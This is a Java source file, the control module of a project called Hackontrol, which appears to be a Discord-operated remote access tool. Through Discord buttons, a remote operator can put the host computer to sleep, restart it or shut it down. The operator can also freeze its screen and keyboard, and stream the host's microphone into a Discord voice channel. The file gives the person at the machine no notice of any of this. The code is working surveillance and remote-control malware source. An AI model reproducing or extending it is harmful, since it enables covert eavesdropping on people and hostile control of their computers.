package com.khopan.hackontrol.module.control;

import java.util.List;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.handler.KeyboardHandler;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.Question;
import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
import com.khopan.hackontrol.module.Module;
import com.khopan.hackontrol.nativelibrary.Kernel;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.sendable.ISendable;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.managers.AudioManager;

public class ControlModule extends Module {
	private static final String MODULE_NAME = "control";

	private static final Button BUTTON_SLEEP      = ButtonManager.staticButton(ButtonType.SECONDARY, "Sleep",      "sleep");
	private static final Button BUTTON_HIBERNATE  = ButtonManager.staticButton(ButtonType.SUCCESS,   "Hibernate",  "hibernate");
	private static final Button BUTTON_RESTART    = ButtonManager.staticButton(ButtonType.PRIMARY,   "Restart",    "restart");
	private static final Button BUTTON_SHUTDOWN   = ButtonManager.staticButton(ButtonType.DANGER,    "Shutdown",   "shutdown");

	private static final Button BUTTON_CONNECT    = ButtonManager.staticButton(ButtonType.SUCCESS,   "Connect",    "connect");
	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonType.DANGER,    "Disconnect", "disconnect");

	private static final Button BUTTON_FREEZE     = ButtonManager.staticButton(ButtonType.SUCCESS,   "Freeze",     "freezeScreen");
	private static final Button BUTTON_UNFREEZE   = ButtonManager.staticButton(ButtonType.DANGER,    "Unfreeze",   "unfreezeScreen");

	private AudioManager audioManager;
	private MicrophoneSendHandler sendHandler;

	public ControlModule() {
		Hackontrol.getInstance().setErrorHandler((thread, Errors) -> {
			if(this.channel != null) {
				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
			}
		});
	}

	@Override
	public String getName() {
		return ControlModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_SLEEP,      context -> this.buttonPower(context, PowerAction.SLEEP));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_HIBERNATE,  context -> this.buttonPower(context, PowerAction.HIBERNATE));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_RESTART,    context -> this.buttonPower(context, PowerAction.RESTART));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_SHUTDOWN,   context -> this.buttonPower(context, PowerAction.SHUTDOWN));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_CONNECT,    context -> this.buttonConnect(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_FREEZE,     context -> this.buttonFreeze(context, true));
		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_UNFREEZE,   context -> this.buttonFreeze(context, false));
	}

	@Override
	public void initialize() {
		this.channel.sendMessage("**Power Control**").addActionRow(ControlModule.BUTTON_SLEEP, ControlModule.BUTTON_HIBERNATE, ControlModule.BUTTON_RESTART, ControlModule.BUTTON_SHUTDOWN).queue();
		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlModule.BUTTON_CONNECT, ControlModule.BUTTON_DISCONNECT).queue();
		this.channel.sendMessage("**Screen State**").addActionRow(ControlModule.BUTTON_FREEZE, ControlModule.BUTTON_UNFREEZE).queue();
	}

	private void buttonPower(ButtonContext context, PowerAction powerAction) {
		Question.positive(context.reply(), "Are you sure you want to " + powerAction.name().toLowerCase() + '?', QuestionType.YES_NO, () -> {
			switch(powerAction) {
			case SLEEP:
				Kernel.sleep();
				break;
			case HIBERNATE:
				Kernel.hibernate();
				break;
			case RESTART:
				Kernel.restart();
				break;
			case SHUTDOWN:
				Kernel.shutdown();
				break;
			}
		});
	}

	private void buttonConnect(ButtonContext context, boolean connect) {
		if((this.sendHandler == null) != connect) {
			HackontrolMessage.boldDeletable(context.reply(), "Microphone is already " + (connect ? "connected" : "disconnected"));
			return;
		}

		Guild guild = context.getGuild();

		if(connect) {
			try {
				if(this.voiceConnect(guild, context.reply(), true)) {
					context.deferEdit().queue();
				}
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}

			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disconnect?", QuestionType.YES_NO, () -> {
			try {
				this.voiceConnect(guild, context.message(), false);
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}
		});
	}

	private void buttonFreeze(ButtonContext context, boolean freeze) {
		if(KeyboardHandler.Freeze == freeze) {
			HackontrolMessage.boldDeletable(context.reply(), "The screen is already " + (freeze ? "frozen" : "unfrozen"));
			return;
		}

		if(!freeze) {
			Question.positive(context.reply(), "Are you sure you want to unfreeze the screen?", QuestionType.YES_NO, () -> this.freeze(false));
			return;
		}

		this.freeze(true);
		context.deferEdit().queue();
	}

	private void freeze(boolean freeze) {
		KeyboardHandler.Freeze = freeze;
		Kernel.setFreeze(freeze);
	}

	private boolean voiceConnect(Guild guild, ISendable sender, boolean connect) throws Throwable {
		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.sendHandler != null) {
			this.sendHandler.close();
			this.sendHandler = null;
		}

		if(!connect) {
			return true;
		}

		List<VoiceChannel> voiceChannelList = guild.getVoiceChannels();
		VoiceChannel channel;

		if(voiceChannelList.isEmpty()) {
			channel = guild.getVoiceChannelById(1230856739793145919L);
		} else {
			channel = voiceChannelList.get(0);
		}

		if(channel == null) {
			HackontrolError.message(sender, "No voice channels were found");
			return false;
		}

		this.sendHandler = new MicrophoneSendHandler();
		this.audioManager.setSendingHandler(this.sendHandler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
		return true;
	}

	private static enum PowerAction {
		SLEEP,
		HIBERNATE,
		SHUTDOWN,
		RESTART;
	}
}
